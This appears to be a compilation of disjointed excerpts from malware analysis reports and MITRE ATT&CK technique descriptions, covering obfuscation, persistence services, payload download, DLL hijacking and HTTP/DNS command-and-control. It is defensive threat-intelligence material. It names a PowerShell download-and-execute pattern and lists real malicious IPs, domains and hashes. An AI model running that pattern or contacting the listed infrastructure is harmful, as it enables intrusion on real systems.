In order to decode this data, Comnie first decodes it using base64 with the following non-standard alphabet (note that it is simply the original alphabet in reverse): /+9876543210zyxwvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA   The resulting data is then parsed and decrypted using RC4
Here is the code:The goal of this code is to get information from the properties of the document ("Subject", "Company", "Category", "Hyperlink base" and finally "Comments")
The subdomain 676f6f646c75636b is a hex encoded string which decodes to goodluck
This DLL serves three main functions: killing antimalware, unpacking and executing the main RAT DLL, and obtaining persistence
The final antidebugging technique involves GetTickCount performance counters, which are placed within the main sections of code to detect any delay a debugger adds during runtime
Even if the arsenal of this actor is diverse, we have identified some patterns, copy-paste code from various public repositories and similarities between the different piece of code
Its purpose is to load Msadoz<n>.dll in order to decrypt and execute it in memory
If after the package has been decoded its size is bigger than 3 bytes, the Trojan decrypts its first 11 bytes with XOR using the method similar to the one described above
The decrypted code resolves the necessary API functions, decompresses the embedded PE file with RtlCompressBuffer() using LZNT1 and maps it into memory
The Visual Basic macro performs the following tasks:  Opens a handle to the malicious document to read the encoded CAB file Decodes the CAB file and writes it to the disk at %temp%\setup.cab   Encoded CAB file in the Word document
Configuration Decryption:  Another small, but same important function in the photo above, is the function for decrypting the data containing the C&C configuration
The MirageFox binaries export a function called dll_wWinMain, the name of an export in vsodscpl.dll, a module by McAfee that is loaded by a few of their executables that import and call this function
The most interesting part is the decrypted C&C configuration, as can be seen in the image below
Figure 2 – The GitHub profile for F0R3X containing both legitimate forked code and the binaries created by the attacker
It also allows macro code to access internal VBA objects for stealthier macro code execution in future attacks
Backdoor analysis The main loop of the backdoor has two main functions, infoClient and runHandle
Packet::getData decrypts the received payload and Converter::outString descrambles the result
In the event this is successful the malware will use the following path to store any dropped files:  %COMMONPROGRAMFILES%\services\  In the event it is not successful, this alternative path will be used instead:  %APPDATA%\microsoft\mmc\  It proceeds to load and decrypt and embedded bitmap resource file
In the event this is successful, the malware will use the following path to store any dropped files:  %COMMONPROGRAMFILES%\services\  In the event it is not successful, this alternative path will be used instead:  %APPDATA%\microsoft\mmc\  Reaver.v2 proceeds to decrypt an embedded file using a simple XOR obfuscation routine
The malware proceeds to decrypt and embedded configuration of 128 bytes using a simple XOR routine
ESET’s analysis of a recent backdoor used by TeleBots – the group behind the massive NotPetya ransomware outbreak – uncovers strong code similarities to the Industroyer main backdoor, revealing a rumored connection that was not previously proven The post New TeleBots backdoor: First evidence linking Industroyer to NotPetya appeared first on WeLiveSecurity
The following code snippet was used to decode strings within OopsIE:out = "" for e in obfuscated_string.split("-"):    out += chr(int(e)-1)When first run, this OopsIE variant runs a variety of checks to avoid running in an analysis environment, as discussed in the previous section
This exception invokes the exception handler containing the HTTP communication code, allowing it to run
Figure 1 – The main code from the .NET wrapper, with the Shellcode array being created and executed in a new thread
The first shellcode decrypts a further shellcode block
After decrypting the strings, they must be further decompressed using LZNT1
It then reads and decrypts the content between these values to yield an IP address as shown below:       ---- BEGIN SSH2 PUBLIC KEY ----Comment: "rsa-key"AAAAB3NzaC1yc2EAAAABJQAAAQEAhLxZe4Qli9xt/WknQK9CDLWubpgknZ0HIHSd8uV/TJvLsRkjpV+U/tMiMxjDwLAHVtNcww2h8bXTtw387M2Iv/mJjQ9Lv3BdNiM3/KvmlpeJZrrFu2n5UC9=DZKSDAAADOECEDFDOCCDEDIDOCIDEDOCHDDZJS=oT+Ps8wD4f0NBUtDdEdXhWp3nxv/mJjQ9Lv3BCFDBd09UZzLrfBO1S0nxrHsxlJ+bPaJE2Q/oxLXTrpeJ6AHyLyeUaBha3q9niJ=---- END SSH2 PUBLIC KEY ----     A Python script to decode strings encrypted with this technique is given in Appendix B – Python Scripts
To decode this information, BADNEWS takes the following steps:  Base64-decode the string Perform the decoding cipher used in previous versions Base64-decode the result Decrypt the result using the Blowfish algorithm and a static key  A script, which is included in the Appendix, will decrypt data from these dead drop resolvers
Interestingly, the delivery document borrowed a technique which was publicized in late 2017 as being used by the Sofacy threat actors, embedding the main malicious code in a EXIF metadata property of the document
The main function of the Trojan interacts with its configured C2 server to obtain additional code to execute
The main function gets pertinent strings to communicate with its C2 by calling a sub-function with a specific number that the sub-function uses as a case within a switch statement to decrypt the desired string
We believe the actor used a cryptor on the payload, as it obtains a filename and script from within its resources and decodes these resources by multiplying each byte by negative one
The payload then uses the MD5 hash (14331d289e737093994395d3fc412afc) of what appears to be a hardcoded SHA1 hash (B6A75B1EF701710D7AEADE0FE93DE8477F3BD506) as an RC4 key to decrypts the resulting decoded data
The unique strings mainly consist of “Mobile/BADDAD“, “Mobile/7B405” and “E9BC3BD76216AFA560BFB5ACAF5731A3”
“Knock” also appears in several strings inside the code of SpeakUp
Indicators  File  Hash  Description  x.js  3fefa55daeb167931975c22df3eca20a  HOMEFRY, a 64-bit Windows password dumper/cracker  mt.exe  40528e368d323db0ac5c3f5e1efe4889  MURKYTOP, a command-line reconnaissance tool   com4.js  a68bf5fce22e7f1d6f999b7a580ae477  AIRBREAK, a JavaScript-based backdoor which retrieves commands from hidden strings in compromised webpages   Historical Indicators  File  Hash  Description  green.ddd  3eb6f85ac046a96204096ab65bbd3e7e  AIRBREAK, a JavaScript-based backdoor which retrieves commands from hidden strings in compromised webpages  BGij  6e843ef4856336fe3ef4ed27a4c792b1  Beacon, a commercially available backdoor  msresamn.ttf  a9e7539c1ebe857bae6efceefaa9dd16  PHOTO, also reported as Derusbi  1024-aa6a121f98330df2edee6c4391df21ff43a33604  bd9e4c82bf12c4e7a58221fc52fed705  BADFLICK, backdoor that is capable of modifying the file system, generating a reverse shell, and modifying its command-and-control configuration
It maintains both code and data in the raw, encrypted blobs of data to be decrypted and used at runtime, and hidden functionality that isn’t exposed until runtime
No pdb/debug strings are present in the code
In total, 29 unique CARROTBAT samples have been identified to date, containing a total of 12 confirmed unique decoy documents
In this particular instance, the payload is encoded via base64, which certutil decodes
The following function written in Python may be used to decode this file:def decode(data): 	out = "" 	c = 0 	for d in data: 		out += chr(ord(d)^c) 		c+=1 	return outOnce decoded it is discovered that this instance of OceanSalt attempts to communicate with 61.14.210[.]72 on port 7117
The following code example shows the false flag being set (5 > 115) and the ETransaksi.diomadnfagaghagh method being called:  int num = 5; int num2 = 155; bool flag = num > num2; if (flag) {     <legitimate Sales System Application code>     }            else {     NewLateBinding.LateCall(ETransaksi.diomadnfagaghagh(), null, "Invoke", new object[]     {         null,         new object[0]     }, null, null, null, true);The payload uses this technique to run a chain of methods that eventually carry out its malicious task
(Source: Dell SecureWorks) Both the redirect code on the compromised site and the exploit code appear and disappear, indicating that the adversaries add the code when they want to leverage the SWC and remove the code when it is not in use to limit the visibility of their operations
The decrypted contents of the log file adhere to the format in Figure 22
Decrypted OwaAuth log file format
The backdoor will load the encrypted configuration file and decrypt it, then use Secure Sockets Layer (SSL) protocol to connect to command-and-control (C&C) servers
Malicious document used by Tropic Trooper PDB Strings as Context Clues The MSI file has two program database (PDB) strings inside: one belonging to the MSI file, and another for the backdoor installer (detected by Trend Micro as TROJ_TCDROP.ZTFB)
The image and table below illustrate TClient’s encrypted configuration that we decrypted (via Python code):  Figure 10
Snapshot of code we used to decrypt TClient’s configuration   Figure 11
Decrypted backdoor configuration Reverse analysis of TClient allowed us to determine how to decrypt the C&C information
Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.

One such example is use of [certutil](https://attack.mitre.org/software/S0160) to decode a remote access tool portable executable file that has been hidden inside a certificate file. (Citation: Malwarebytes Targeted Attack against Saudi Arabia) Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload. (Citation: Carbon Black Obfuscation Sept 2016)

Sometimes a user's action may be required to open it for deobfuscation or decryption as part of [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016)
Create Service
Further collaboration between FireEye as a Service (FaaS), Mandiant and FireEye iSIGHT intelligence uncovered additional victims worldwide, a new suite of tools and novel techniques
In addition, web traffic between a service provider’s customer and a service provider is likely to be viewed as benign by network defenders at the customer, allowing the attacker to exfiltrate data stealthily
This effectively routes SOGU malware traffic through the victim’s service provider, which likely indicates a foothold on the service provider’s network
These parameters install it as a service
The malware operates on victims’ systems as a svchost-based service and is capable of downloading executables, changing its own configuration, updating its own binaries, terminating its own processes, and activating and terminating denial-of-service attacks
The malicious DLL is not a service DLL because it lacks ServiceMain()
The victims Data from Cadelle’s C&C servers shows that a large number of Backdoor.Cadelspy infections affected individual users of Iranian internet service providers (ISPs) and hosting services
"Are you Happy?" campaign."FreeMilk" campaign."North Korean Human Rights" campaign."Evil New Year 2018" campaign.On January 2nd of 2018, the "Evil New Year 2018" was started
The document brought Talos a new gift - a new version of ROKRAT
Figure 2: AuditCred/ROptimizer Service If successfully installed, this particular backdoor poses quite a threat to its target
BootComplete starts the AutoStartup service and the AutoStartup service makes sure that MainActivity is always running
Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services.(Citation: TechNet Services) On macOS, launchd processes known as [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) and [Launch Agent](https://attack.mitre.org/techniques/T1543/001) are run to finish system initialization and load user specific parameters.(Citation: AppleDocs Launch Agent Daemons) 

Adversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect.  

Services, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges.(Citation: OSX Malware Detection)  
HAYMAKER is a backdoor that can download and execute additional payloads in the form of modules
It downloads the file to the infected machine from the input URL using BITSAdmin, and is called every time the script attempts to download a file
The XSL script contains additional hard coded variables sVarRaz and sVar2RazX, which contain file paths that direct to the downloaded files.   The file’s path
The directory creation.  Downloading the Payloads The remote XSL script downloads twelve files from the C2 server that masquerade themselves as JPEG, GIF, and extensionless files
A thorough explanation of what information is collected can be found in a breakdown by Cofense from late 2018.   The script verifies all parts of the malware have been downloaded.  After downloading the payload, the XSL script checks to make sure every piece of the malware was downloaded.   One of the twelve download commands as detected by the Cybereason platform in same variant of Astaroth.   The twelve downloaded files
The config file provides download instructions for the loader
Displayed below are these new, xml formatted plugin names “weap_hwi”, “ps”, and “vsnet” in a BlackEnergy configuration file download from a c2 server
One of the discovered config files contained a URL with an as yet unidentified md5: hxxps://46.165.222(dot)28/upgrade/bf0dac805798cc1f633f19ce8ed6382f/upgrade.php Victim set #4 A set of victims discovered installed Siemens SCADA software in their ICS environment was responsible for downloading and executing BlackEnergy
HighShell v5.0 explorer tab allows actor to navigate the file system The HighShell v7.1 variant from the data dump contains similar functionality to its predecessors and continued the tabular approach but expanded even further by splitting out the main functionality across multiple tabs, specifically “Command”, “Explorer”, “Upload”, “Download”, “Sql Server” and “Change Time”
Network Downloader The Network Downloader functionality allows the actor to quickly upload user files from remote victim systems
The sample, in the form of an RTF document, exploited CVE-2016-4117 to download and install a program from a remote C&C server
Symantec determined a more accurate picture of Buckeye’s targets by looking at where Buckeye remained active on the network longer than a day, deployed additional tools, and spread onto multiple computers
The BITS mechanism has existed since Windows XP up to the current Windows 10 versions and was developed to create download/upload jobs, mostly to update the OS itself
It uses the Dropbox API with a hardcoded bearer access token and has the ability to download, upload, and execute files
Using this information, they can decide to explore further or instruct the compromised computer to download additional malware
In this case, after the payload is delivered via an exploit the threat actor places files (named upload.bat, upload.rar, and period.txt, download.txt or silent.txt) in a directory on a Dropbox account
Upon execution, the initialized file downloads multiple malicious payloads from remote servers
Figure 4 Microsoft Word attempting to download the remote template If the C2 server is active at the time the document is opened, it will successfully retrieve the malicious macro and load it in the same Microsoft Word session
If the C2 server is not active at this time, the download will fail and the victim will not receive a prompt to Enable Content as no macro is downloaded
attachedTemplate.dotm xxx 11/15/18 05:35 11/15/18 05:35 109.248.148[.]42    Table 2 Remote templates downloaded by Dear Joohn delivery documents As seen in Table 1, the delivery documents accessed their respective remote templates from four C2 servers at the following IP addresses:  185.203.118[.]198 145.249.105[.]165 188.241.58[.]170  109.248.148[.]42  These initial C2 IP addresses not only hosted the remote templates that subsequently load the first-stage Zebrocy or Cannon payloads, but the IP addresses also hosted the C2 server for the first-stage payloads themselves
The POSHSPY backdoor is designed to download and execute additional PowerShell code and Windows binaries
If the user clicks on the link, he will be prompted to download a RAR file that contains the stage 1 malware/lure, which he will execute afterwards
The executable attempts to download a couple of files from different sources and saves them in the AppData and Startup folders for persistence, then invokes the first downloaded file – Picture2.exe
The RAT, however, had a multitude of functionalities (as listed in the table below) such as to download and execute, compress, encrypt, upload, search directories, etc
The link provided in the malicious email led to a fake VPN Web Portal:  Upon logging in with the credentials provided in the email, the victim is presented with the following page:  The victim is asked to install the “VPN Client” (an .exe file), or, if download fails, to download a password protected zip (with the same .exe file inside)
This document was alleged to have been written by the Ministry of Reunification as demonstrated by the logo in the top left.Similar to the "Golden Time" campaign, this document exploits an EPS vulnerability in order to download and execute shellcode located on a compromised website:hxxp://60chicken[.]co[.]kr/wysiwyg/PEG_temp/logo1.pngThe fake image usage is a common pattern for this group
The macro contains malicious code that attempts to download content from a remote server
!DWN  Downloads a file from a specified URL
Responds to the IRC server via PRIVMSG with “Download  Success :FilePath=<path to downloaded file>” or “Download Fail” if unsuccessful
The IRC variant of MPK has a command set (Table 2) that makes this an effective backdoor Trojan, specifically allowing the actors to steal credentials from the targeted system via keylogging, to navigate and interact with the file system, to run arbitrary commands, and to download and execute additional tools on the system
It exploits CVE-2017-0199 to download the second stage payload from 193.23.181.151 (Figure 3)
Figure 4: Downloading second stage Seminar.rtf The downloaded Seminar.rtf contains an embedded binary file that is dropped in %temp% via Equation Editor executable
Zyklon is a publicly available, full-featured backdoor capable of keylogging, password harvesting, downloading and executing additional plugins, conducting distributed denial-of-service (DDoS) attacks, and self-updating and self-removal
The DOC file contains an embedded OLE Object that, upon execution, triggers the download of an additional DOC file from the stored URL (seen in Figure 3)
Upon opening the malicious DOC attachment, an additional download is triggered from a stored URL within an embedded OLE Object (seen in Figure 4)
Figure 4: Embedded URL in OLE object    Figure 5: HTTP GET request to download the next level payload The downloaded file, doc.doc, is XML-based and contains a PowerShell command (shown in Figure 6) that subsequently downloads the binary Pause.ps1
Figure 8 shows the network communication of the Pause.ps1 download
Figure 8: Network communication to download the Pause.ps1 payload Zyklon Delivery In all these techniques, the same domain is used to download the next level payload (Pause.ps1), which is another PowerShell script that is Base64 encoded (as seen in Figure 8)
I download my tools from GitHub, and so do my victims
The “upload” command downloads files from the CnC and saves them locally in “C:\ProgramData“
Additional information In the advanced stages of this research, we were able not only to observe additional files and tools from the attackers’ arsenal but also some OPSEC mistakes made by the attackers
It will:  Download and execute the backdoor component Replace the content of the downloader Mach-O executable with a decoy, either using a base64-encoded embedded file or by downloading it from the internet Open a decoy document (described later) Close the Terminal window that just opened  The decoy document replaces the downloader Mach-O file, which means the malicious executable is only present in the ZIP file now
This file issued a GET request to download a malicious file from: hxxp://94.23.172.164/dupdatechecker.doc
As shown in Figure 12, the script within the dupatechecker.doc file attempts to download another file named dupatechecker.exe from the same server
Anyconnect[.]stream Bigip[.]stream Fortiweb[.]download Kaspersky[.]science microtik[.]stream owa365[.]bid symanteclive[.]download windowsdefender[.]win  The listed C2 servers all resolved to IPs belonging to a service provider in China at 1.2.9.0/24, which is the IP address used by the C2 server to send a cancel communications message to the end system
The .iqy files take advantage of Excel’s willingness to download and include the contents from a remote server in a spreadsheet
2 Downloads a file to the system
Once the victim downloads and executes the email attachment, it runs silently with no additional decoy documents or decoy dialog boxes
This includes, but is not limited to, the following:  AES encryption of network communication File management Functionality to download, upload, and execute files Keylogging Remote desktop access Remote webcam viewing Reverse proxy Browser and FTP client password recovery  The images below are what a target user opening a malicious RTF document would see from within Microsoft Word
13 Copy file to adbFle.tmp, and upload it to the C2
When opened and then executed, the key components of the HTA file downloads and executes further malware from a remote URLand loads a decoy image hosted externally (Figure 3)
Both responses instruct the malware to download and load a remote plugin
During a file analysis of PLAINTEE in WildFire, we observed the attackers download and execute a plugin during the runtime for that sample
Most of them manipulate the machine to download and execute different files
Use of PowerShell to download additional tools
The purpose is to download and execute an additional payload hosted on a compromised website: NavRAT
NavRAT is able to download and execute files located in the attachment of a received email
The shellcode of the embedded object is designed to download an image, which is, in fact, a new shellcode used to decode an embedded executable
Figure 2 SYSCON network traffic witnessed during execution   Pivoting on the domain hosting the SYSCON sample, 881.000webhostapp[.]com, revealed a number of additional samples, including a sample of the KONNI malware family, and four 64-bit executable files belonging to the CARROTBAT malware family
CARROTBAT itself is a dropper that allows an attacker to drop and open an embedded decoy file, followed by the execution of a command that will download and run a payload on the targeted machine
Delivery document The delivery document contains a macro that downloads an executable from a remote server
Command_Down_exec: This command downloads and executes new modules.  It takes a url as the argument and uses that to download and execute files
Its presence on a compromised system allows a threat actor to spawn a reverse shell, upload or download files, and capture keystrokes
After reestablishing access, the adversaries download tools such as gsecudmp and WCE that are staged temporarily on websites that TG-3390 previously compromised but never used
The OwaAuth web shell enables a threat actor to upload and download files, launch processes, and execute SQL queries
The script self-scheduling, as well as the scheduling of a script that repeatedly attempts to download and execute the Revenge RAT binary, significantly contribute to the persistence of this infection
A backdoor that communicates with a single command and control (C2) server using HTTP GET and POST requests, TONEDEAF supports collecting system information, uploading and downloading of files, and arbitrary shell command execution.
We found a mechanism for decrypting, executing, and downloading an additional payload from the C&C server.

certutil is a WIndows component that can download external content to the computer. In a typical attack, the criminals follow this paradigm
The SQLRat script is designed to make a direct SQL connection to a Microsoft database controlled by the attackers and execute the contents of various tables
The backdoor has the capability to download and upload files, execute shell commands, and update its configuration.
Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp](https://attack.mitre.org/software/S0095). Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)). 

Files can also be transferred using various [Web Service](https://attack.mitre.org/techniques/T1102)s as well as native or otherwise present tools on the victim system.(Citation: PTSecurity Cobalt Dec 2016)

On Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, and [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.(Citation: t1105_lolbas)
BUGJUICE is a backdoor that is executed by launching a benign file and then hijacking the search order to load a malicious dll into it
This most likely means there is some type of DLL hijacking going on by distributing a legitimate McAfee binary with MirageFox to load up the DLL properly into a legitimate looking process
Whitefly has consistently used a technique known as search order hijacking to run Vcrodat.
Attackers can therefore give a malicious DLL the same name as a legitimate DLL but place it ahead of the legitimate version in the search order so that it will be loaded when Windows searches for it.
Nibatad is also a loader that leverages search order hijacking, and downloads an encrypted payload to the infected computer.
Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft Dynamic Link Library Search Order)(Citation: FireEye Hijacking July 2010) Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.

There are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program.(Citation: FireEye fxsst June 2011) Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft Security Advisory 2269637)

Adversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.(Citation: Microsoft Dynamic-Link Library Redirection)(Citation: Microsoft Manifests)(Citation: FireEye DLL Search Order Hijacking)

If a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.
BUGJUICE defaults to TCP using a custom binary protocol to communicate with the C2, but can also use HTTP and HTTPs if directed by the C2
SNUGRIDE is a backdoor that communicates with its C2 server through HTTP requests
We mentioned earlier that due to the nature of the IE injection technique used by the HTTP-based backdoors, a number of C2 commands were cached to disk
And, according to the collected config files, the group upgraded their malware communications from plain text http to encrypted https in October 2013
Figure 1: Configuration file that adds new C2 server and forces the data-stealing backdoor to use it   Figure 2: Configuration file that adds TCP tunnels and records desktop video Command and Control CARBANAK communicates to its C2 servers via pseudo-HTTP or a custom binary protocol
Pseudo-HTTP Protocol Messages for the pseudo-HTTP protocol are delimited with the ‘|’ character
We recently mentioned this tool in another report on April 16, as this variant of the BONDUPDATER tool used DNS tunneling to communicate with its C2, specifically using TXT queries to receive information from the C2 server
Server Command and control server that communicates via DNS tunneling   Panel Graphical User Interface that allows actors to issue commands, upload and download files to Agents via the Server    Table 2
The Poison Frog server handles both the HTTP and DNS tunneling channels used by the hUpdater.ps1 and dUpdater.ps1 scripts
Its C2 is based on IIS using .asp technology to handle the victims’ HTTP requests
The example C2s used by older variants of Comnie demonstrates this:  Figure 9 Old Comnie variants collecting C2 information Please refer to the Appendix for a script that may be used to decode C2 information from the older Comnie variants
After Comnie collects the remote C2 information, it will communicate with these remote servers using HTTP requests
The URIs used in the HTTP requests are randomly generated
Table 2 Sandbox evasion checks in the C# variant of RogueRobin Like the original version, the C# variant of RogueRobin uses DNS tunneling to communicate with its C2 server using a variety of different DNS query types
Figure 2 Code that issues DNS query to gogle.co if a debugger is detected All DNS requests issued by RogueRobin use the built in nslookup.exe application to communicate to the C2 server and the Trojan will use a variety of regular expressions to extract data from the DNS response
Character  Digit   h 0   i 1   j 2   k 3   l 4   m 5   n 6   o 7   p 8   q 9    Table 4 Character substitution used in RogueRobin The Trojan will use future DNS requests to retrieve jobs from the C2 server, which the Trojan will handle as commands
The x_mode command is disabled by default, but when enabled via a command received from the DNS tunneling channel, it allows RogueRobin to receive a unique identifier and to get jobs by using Google Drive API requests
Background From October 2012 to May 2014, FireEye observed APT12 utilizing RIPTIDE, a proxy-aware backdoor that communicates via HTTP to a hard-coded command and control (C2) server
If you compare the HTTP GET request from the RIPTIDE samples (Figure 1) to the HTTP GET request from the HIGHTIDE samples (Figure 3) you can see the malware author changed the following items:  User Agent Format and structure of the HTTP Uniform Resource Identifier (URI)   Figure 3: HIGHTIDE GET Request Example Similar to RIPTIDE campaigns, APT12 infects target systems with HIGHTIDE using a Microsoft Word (.doc) document that exploits CVE-2012-0158
Similar to RIPTIDE and HIGHTIDE, the WATERSPOUT backdoor is an HTTP-based backdoor that communicates with its C2 server
11/1/18 sahro.bella7 trala.cosh2 Bishtr.cam47 Lobrek.chizh Cervot.woprov    Table 5 Gathered C# Cannon samples As mentioned in our initial blog, the actor controlled email address acting as the C2 was sahro.bella7[at]post.cz, but all previous samples of Cannon used sym777.g[at]post.cz
Even though Delphi Cannon uses POP3S and SMTPS for its C2 communications like Cannon, it is arguably easier to defend against as it uses an actor owned domain that defenders can easily block and not a legitimate email provider such as Seznam
The screenshot in Figure 8 of the inf method within a Cannon sample (SHA256: 4405cfbf28…) shows the information gathered that is exfiltrated to the C2 via email, specifically with RunningPlace and LogicalDrives header strings:  Figure 8 inf method used by Cannon When comparing the two Cannon variants, we found a method within a Delphi Cannon sample (SHA256: 5a02d4e5f6…) showing the use of Running place and Logical_Drivers as header strings to the system information it is collecting and sending to the C2 via email
The shellcode retrieves an additional payload by connecting to the following C2 server using DNS: aaa.stage.14919005.www1.proslr3[.]com Once a successful reply is received from the command and control (C2) server, the PowerShell script executes the embedded Cobalt Strike shellcode
Later variants upload the file to a web server via an HTTP post command
Retriever uses .NET web services and the SoapHttpClientProtocol class to communicate with its C2 server, which generates HTTP requests resembling the example request in Figure 4
The shellcode executed by this command is the same as in the delivery documents as well, specifically taken from Metasploit to obtain additional shellcode to execute using an HTTP request to the following URL: http://www7.chrome-up[.]date/0m5EE We are unsure of the shellcode hosted at this URL, as we were unable to coerce the C2 server to provide a payload
Once these variables are set, the malware uses the SoapHttpClientProtocol class to communicate with its C2 server, which issues an HTTP POST requests that appears as:  As you can see from the above request, the SoapHttpClientProtocol class neatly structures data into an HTTP POST request
All subsequent interaction with the C2 server uses the same SOAP web service, so we will not show all of the generated HTTP requests
Figure 9: Command logs after execution Network Communications FELIXROOT communicates with its C2 via HTTP and HTTPS POST protocols
Table 3: FELIXROOT backdoor parameters  Cryptography All data is transferred to C2 servers using AES encryption and the IbindCtx COM interface using HTTP or HTTPS protocol
Previous related research: https://sec0wn.blogspot.com/2018/05/clearing-muddywater-analysis-of-new.html?m=1 https://reaqta.com/2017/11/muddywater-apt-targeting-middle-east/ https://blog.malwarebytes.com/threat-analysis/2017/09/elaborate-scripting-fu-used-in-espionage-attack-against-saudi-arabia-government_entity/ https://www.sekoia.fr/blog/falling-on-muddywater/  Decoy images by country Jordan     The Hashemite Kingdom of Jordan, Ministry of Justice (mwjo.doc) DAMAMAX.doc    Turkey     Turkey’s General Directorate of Security Turkey’s Directorate General of Coastal Safety        Turkey’s General Directorate of Security (Onemli Rapor.doc) Turkey’s Ministry of the Interior (Early election.doc)    Saudi Arabia Document signed by the Major General Pilot, commander of the Saudi Royal Air Force     KSA King Saud University (KSU) KSA King Saud University (KSU)    Azerbaijan İnkişaf üçün görüş.doc (meeting for development) Iraq     Iraqi Ministry of Foreign Affairs Government of Iraq, the Treasury of the Council of Ministers    Pakistan     ECP.doc National Assembly of Pakistan.doc        P.Police.doc     Afghanistan President.doc, E-government of Afghanistan Technical details Below is a description of the malware extraction and execution flow, starting from the initial infection vector, running VBA code via a macro and then dropping the PowerShell code that establishes command-center communications, sends victim system information and then receives commands supported by the malware
http://www.cankayasrc[.]com/style/js/main.php http://ektamservis[.]com/includes/main.php http://gtme[.]ae/font-awesome/css/main.php  Recommendations for organizations Effective protection from targeted attacks focuses on advanced detective, preventive and investigative capabilities via solutions and training, allowing an organization to control any activities on their network or suspicious files on user systems
This information can then be transmitted to the attacker using protocols such as FTP, HTTP, and SMTP
tfvn[.]com[.]vnshirkeswitch[.]netguideofgeorgia[.]orggulfclouds[.]sitejhssourcingltd[.]comkamagra4uk[.]compioneerfitting[.]compositronicsindia[.]comscseguros[.]ptspldernet[.]comtoshioco[.]comwww[.]happytohelpyou[.]inIP addressesThe following IP addresses have been observed to be associated with malware campaigns.112.213.89[.]4067.23.254[.]6162.212.33[.]98153.92.5[.]124185.117.22[.]19723.94.188[.]24667.23.254[.]17072.52.150[.]218148.66.136[.]62107.180.24[.]253108.179.246[.]13818.221.35[.]21494.46.15[.]20066.23.237[.]18672.52.150[.]218URLs:The following URLs have been observed to be associated with malware campaigns.https[:]//a[.]pomf[.]cat/http[:]//pomf[.]cat/upload[.]php
The initial DNS query sent by the payload to obtain the system specific identifier uses the following structure, which includes the current process identifier (PID) as the subdomain of the C2 domain: <current process id>.<c2 domain> The C2 server will provide the system specific identifier within the answer portion of the DNS response
The following shows the specific IP addresses or strings used by the C2 to transmit a success or cancel message depending on the type of DNS query used for C2 communications:    DNS Type Successful Cancel   A,AC 1.1.1.\d+ 1.2.9.\d+   AAAA 2a00:: 2200::   CNAME,MX,TXT,SRV,SOA ok cancel    After providing system specific information, the payload will Interact with the C2 server to obtain commands, which the payload refers to as jobs
To obtain strings to treat as commands, the payload will issue a series of DNS queries to resolve domains with the following structure: <system id>-<job ID>-<offset data specific to job>.<c2 domain> The C2 server will provide responses to these queries that contain answers in IPv4 or IPv6 addresses depending on the type of DNS query the payload uses to communicate with its C2 server
This command will automatically set the DNS type to use for actual C2   $showconfig Uploads the current configuration of the payload to the C2   slpx:\d+ Sets the sleep interval between outbound DNS requests   $fileUpload Downloads contents from the C2 server and writes them to a specified file    Table 3 Commands available to payload Campaign Analysis The following domains are configured within the payload to be used as C2s
For instance, the downloader will first attempt to communicate with its C2 server using an HTTPS request
If that HTTPS request is not successful, the downloader will issue an HTTP request
Lastly, if the HTTP request is not successful, the downloader will fallback to using DNS tunneling to establish communications
If both attempts fail and the payload is unable to obtain a session ID and pre-shared key via HTTP or HTTPS, it will try to use DNS tunneling
It does so using either the HTTPS/HTTP or DNS channels, depending on which method is successful
The payload will construct a message that has the following structure that it will then send to the C2:   bye<char uuid[35]>d   The message above is sent via a simple HTTPS/HTTP POST request to the C2 server
As seen in the above request, the Trojan will generate a URL for its beacon with the following structure:http://<c2 domain>/chk?<hex(Environment.UserName/Environment.MachineName)> The Trojan will issue a request to this URL to check (hence the chk string in the URL) to see if the C2 server has a command for the Trojan to run
The Trojan will then read the hexadecimal formatted contents of this file in 1500 byte blocks, sending each 1500 bytes of data from the file to the C2 server via an HTTP GET request to a URL with the following structure:http://<c2 domain>/resp?<hex(Environment.UserName/Environment.MachineName)>AAZ<hex(command prompt output)> The upload command (2) writes data provided by the C2 to a specified file
[1] https://www.clearskysec.com/report-the-copykittens-are-targeting-israelis/ [2] https://www.clearskysec.com/copykitten-jpost/
After the C2 information has been collected, BADNEWS leverages HTTP for communication with the remote servers
